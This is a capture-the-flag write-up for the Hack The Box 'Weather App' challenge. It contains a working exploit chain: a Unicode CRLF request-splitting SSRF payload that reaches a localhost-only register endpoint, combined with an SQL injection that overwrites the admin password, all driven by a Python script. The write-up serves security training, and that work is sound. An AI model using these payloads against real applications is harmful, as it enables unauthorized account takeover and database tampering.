# Weather App
This is a web exploitation on HTB that leverages on SSRF and SQL Injection


# Exploitation

In the source code, we realize that to register an account, we would need the POST request to be sent from the local server as the source code checks for whether the request comes from the local host. In order to exploit this endpoint, we might need to look for SSRF vulnerabilities in other endpoints to register a new account

```
router.post('/register', (req, res) => {

	if (req.socket.remoteAddress.replace(/^.*:/, '') != '127.0.0.1') {
		return res.status(401).end();
	}

	let { username, password } = req.body;

	if (username && password) {
		return db.register(username, password)
			.then(()  => res.send(response('Successfully registered')))
			.catch(() => res.send(response('Something went wrong')));
	}

	return res.send(response('Missing parameters'));
});
```

In the /login endpoint, we also realize that we would need to login as an admin user to be able to view the flag.

```
router.post('/login', (req, res) => {
	let { username, password } = req.body;

	if (username && password) {
		return db.isAdmin(username, password)
			.then(admin => {
				if (admin) return res.send(fs.readFileSync('/app/flag').toString());
				return res.send(response('You are not admin'));
			})
			.catch(() => res.send(response('Something went wrong')));
	}
	
	return re.send(response('Missing parameters'));
});
```

In the /api/weather endpoint, we realize that this endpoint will redirect to another endpoint in the WeatherHelper.js file, which could be exploited to conduct a SSRF attack.

```
let apiKey = '10a62430af617a949055a46fa6dec32f';
let weatherData = await HttpHelper.HttpGet(`http://${endpoint}/data/2.5/weather?q=${city},${country}&units=metric&appid=${apiKey}`); 
```

To be able to login, we have to construct a payload to first register an admin user that we can login.

```
POST /register HTTP/1.1
Host:127.0.0.1
Content-Type: application/x-www-form-urlencoded

username=admin&password=admin
```

However, we are still unable to register the user yet. This is because the query used is ```INSERT INTO users (username, password) VALUES ('${user}', '${pass}')```. Hence, if a user exists, we will not be able to regitser the user.

At the same time, we realize that the user and pass variables are not sanitized properly when updating the database. This means that we can do an SQL injection to update the admin's password using the following query.

```
1234') ON CONFLICT(username) DO UPDATE SET password = 'flag';--
```

Lastly, we will just write a script to register as an admin user, and logging in as an admin user will give us the flag.

```
import requests


url = "http://167.172.49.117:32583/api/weather"

username = 'admin'
password = "1337') ON CONFLICT(username) DO UPDATE SET password = 'abcde';--"

parseUsername = username.replace(" ", "\u0120").replace("'", "%27").replace('"', "%22")
parsePassword = password.replace(" ", "\u0120").replace("'", "%27").replace('"', "%22")
contentLength = len(parseUsername) + len(parsePassword) + 19
endpoint =  '127.0.0.1/\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010A\u010D\u010APOST\u0120/register\u0120HTTP/1.1\u010D\u010AHOST:\u0120127.0.0.1\u010D\u010AContent-Type:\u0120application/x-www-form-urlencoded\u010D\u010AContent-Length:\u0120' + str(contentLength) + '\u010D\u010A\u010D\u010Ausername=' + parseUsername + '&password=' + parsePassword + '\u010D\u010A\u010D\u010AGET\u0120/?wtfamidoing='
r = requests.post(url, json={'endpoint': endpoint, 'city': 'Singapore', 'country': 'SG'})

print(r)
```
